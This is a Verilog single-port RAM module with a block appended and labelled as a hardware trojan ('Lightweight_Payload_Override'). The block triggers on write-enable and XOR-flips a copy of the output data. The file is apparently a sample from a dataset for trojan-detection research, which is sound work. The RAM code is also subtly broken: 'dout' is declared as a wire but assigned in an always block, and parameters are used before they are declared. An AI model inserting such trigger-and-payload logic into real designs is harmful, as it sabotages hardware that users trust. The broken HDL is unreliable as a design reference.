module single_port_RAM (
  input clk,
  input we,
  input [n-1:0] addr,
  input [m-1:0] din,
  output [m-1:0] dout
);

parameter n = 4; // number of address bits
parameter m = 8; // number of data bits
parameter k = 16; // number of memory locations

reg [m-1:0] mem [0:k-1];

always @(posedge clk) begin
  if (we) begin
    mem[addr] <= din;
  end
  else begin
    dout <= mem[addr];
  end
end



// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg [7:0] htrojan_pay;
always @(*) begin
    htrojan_trig = (we == 1'b1);
    htrojan_pay = htrojan_trig ? (dout ^ 8'h01) : dout;
end
// HT_END
endmodule
